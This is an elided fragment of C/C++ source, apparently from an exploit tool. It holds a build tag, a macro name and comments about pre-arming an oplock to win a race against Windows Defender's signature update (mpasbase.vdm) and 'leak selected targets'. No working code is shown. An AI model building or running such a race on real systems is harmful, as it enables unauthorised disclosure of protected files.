// File updated: 2026-09-11 05:00:36 UTC
...
#pragma message("BlueHammerFix oplock pre-arm enabled: BHF-OPLOCKPREARM-20260911-R6")
...
static const char TRACE_BUILD_ID[] = "BHF-OPLOCKPREARM-20260911-R6";
...
#define FLOW_FAIL_WIN32(stage, reason) \
	...
	try {
		...
		for (int x = 0; x < 1; x++) // single WD update pass — leak selected targets simultaneously (up to 3)
		{
			...
			// Waiting until after the directory notification can lose the race when
			// Defender reads mpasbase.vdm immediately after creating its output folder.
